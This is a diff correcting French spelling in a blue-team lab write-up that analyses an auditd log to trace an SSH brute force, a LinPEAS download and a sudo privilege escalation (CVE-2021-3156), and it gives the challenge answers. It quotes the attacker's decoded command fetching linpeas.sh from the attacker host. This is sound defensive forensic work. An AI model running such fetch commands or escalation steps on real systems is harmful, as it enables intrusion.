@@ -18,7 +18,7 @@
     └── Challenge Files/
         └── audit.log
 
-> ⚠️ PS: celui la etait relativement compliquer  
+> ⚠️ PS: celui-là était relativement compliqué  
 
 ---
 
@@ -33,19 +33,19 @@
 | Réponse | **btlo** |
 | Outil | `aureport` |
 
-j'ai donc utiliser aureport
+j'ai donc utilisé aureport
 
     sudo aureport -if audit.log -au
 
 -if,--input <Input File name>	use this file as input  
 -au,--auth			Authentication report  
 
-ce qui ma donner de nombreuse reponse dont 
+ce qui m'a donné de nombreuses réponses dont 
 
     89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
     90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442
 
-➡️ j'ai pue deduire dans la collone host : **btlo**
+➡️ j'ai pu déduire dans la colonne host : **btlo**
 
 ---
 
@@ -55,17 +55,17 @@ ce qui ma donner de nombreuse reponse dont
 |--------|--------|
 | Réponse | **Brute Force** |
 
-jai donc utiliser aureport 
+j'ai donc utilisé aureport 
 
     aureport -if audit.log  
 
-ce qui ma donner de nombreuse reponse dont 
+ce qui m'a donné de nombreuses réponses dont 
 
     Number of failed logins: 87
     Number of authentications: 3
     Number of failed authentications: 89
 
-➡️ jai pue en deduire une attaque par **brutforce**
+➡️ j'ai pu en déduire une attaque par **bruteforce**
 
 ---
 
@@ -75,7 +75,7 @@ ce qui ma donner de nombreuse reponse dont
 |--------|--------|
 | Réponse | **192.168.4.155** |
 
-j'ai utiliser le resultat tirer de la commande pour la question 1 
+j'ai utilisé le résultat tiré de la commande pour la question 1 
 
     sudo aureport -if audit.log -au
 
@@ -91,23 +91,23 @@ j'ai utiliser le resultat tirer de la commande pour la question 1
 |--------|--------|
 | Réponse | **LinPEAS** |
 
-jai reutiliser un commande utiliser par lattaquant 
+j'ai réutilisé une commande utilisée par l'attaquant 
 
     /usr/bin/wget pts1 192.168.4.155 1001 468454
 
-jai donc repris levent ID : 
+j'ai donc repris l'event ID : 
 
     grep -A5 "468454" audit.log
 
-ce qui ma sortie le 
+ce qui m'a sorti le 
 
     proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368
 
-je les decoder avec cette commande 
+je l'ai décodé avec cette commande 
 
     echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p
 
-et il ma resortie la commande utiliser en clair 
+et il m'a ressorti la commande utilisée en clair 
 
     wget -O - http://192.168.4.155:8000/linpeas.sh
 
@@ -121,17 +121,17 @@ et il ma resortie la commande utiliser en clair
 |--------|--------|
 | Réponse | **evil,829992** |
 
-ses=49 etant la session de l'attaquant jai chercher les les événements sudo réussis avec leur PID 
+ses=49 étant la session de l'attaquant j'ai cherché les événements sudo réussis avec leur PID 
 
     grep "ses=49" audit.log | grep "sudo" | grep "res=success"
 
-➡️ ce qui ma donner le PID du shell root : **829992**
+➡️ ce qui m'a donné le PID du shell root : **829992**
 
-par la suite jai utiliser cette commande : 
+par la suite j'ai utilisé cette commande : 
 
     grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
 
-elle me permet de grep tout ce qui trouve avant levent 481036 et  
+elle me permet de grep tout ce qui se trouve avant l'event 481036 et  
 
 "EXECVE|PROCTITLE|exe=" :  
 
@@ -139,15 +139,15 @@ elle me permet de grep tout ce qui trouve avant levent 481036 et
 - PROCTITLE : commande complète  
 - exe= : chemin du binaire  
 
-jen ai tirer 
+j'en ai tiré 
 
     proctitle=2E2F6576696C0030
 
-et je les decoder avec cette commande 
+et je l'ai décodé avec cette commande 
 
     echo "2E2F6576696C0030" | xxd -r -p
 
-ce qui ma donner 
+ce qui m'a donné 
 
     ./evil0
 
@@ -165,18 +165,18 @@ en faisant cette commande
 
     grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
 
-jai pue observer 
+j'ai pu observer 
 
     comm="sudoedit"
 
 juste avant le shell root  
 
-l'attaquant depuis tout a lheure essaye d'escalader les privilege  
+l'attaquant depuis tout à l'heure essaye d'escalader les privilèges  
 
-ce qui ma mener a ce site  
+ce qui m'a mené à ce site  
 https://www.sentinelone.com/vulnerability-database/cve-2021-3156/  
 
-puis je suis allez voir les details sur ce site la  
+puis je suis allé voir les détails sur ce site-là  
 https://nvd.nist.gov/vuln/detail/cve-2021-3156  
 
 ---
@@ -187,7 +187,7 @@ https://nvd.nist.gov/vuln/detail/cve-2021-3156
 |--------|--------|
 | Réponse | **Heap-Based Buffer Overflow** |
 
-mentionner ici  
+mentionné ici  
 https://nvd.nist.gov/vuln/detail/cve-2021-3156  
 
 ---
